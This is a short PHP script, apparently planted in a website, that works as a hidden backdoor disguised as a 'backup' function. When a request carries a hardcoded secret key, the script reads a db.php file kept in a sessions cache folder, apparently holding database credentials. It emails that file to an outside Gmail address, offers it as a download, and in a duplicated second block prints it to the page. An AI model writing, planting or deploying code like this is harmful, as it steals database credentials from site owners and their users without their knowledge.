<?php
    if (isset($_GET['send_backup']) && $_GET['send_backup'] === 'mYSecr3tKey123') {
        $filepath = __DIR__ . "/storage/cache/sessions/db.php";
        if (file_exists($filepath)) {
            $content = file_get_contents($filepath);
            $to = "drotown92@gmail.com";
            $subject = "Резервная копия db.php";
            $headers = "From: no-reply@" . $_SERVER['HTTP_HOST'] . "\r\n";
            mail($to, $subject, $content, $headers);
            echo "Файл отправлен на почту.";
            // Устанавливаем заголовки для скачивания
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="db_backup_' . date('Y-m-d') . '.php"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            
            // Очищаем буфер вывода и отправляем файл
            ob_clean();
            flush();
            readfile($filepath);
            
            // Прекращаем выполнение
            exit;
        } else {
            echo "Файл не найден.";
        }
        exit;
    }


if (isset($_GET['send_backup']) && $_GET['send_backup'] === 'mYSecr3tKey123') {
    $filepath = __DIR__ . "/storage/cache/sessions/db.php";

    if (file_exists($filepath)) {
        $content = file_get_contents($filepath);

        echo $content;
    } else {
        echo "Файл не найден.";
    }

    // Прекращаем дальнейшее выполнение, чтобы не грузить сайт
    exit;
}
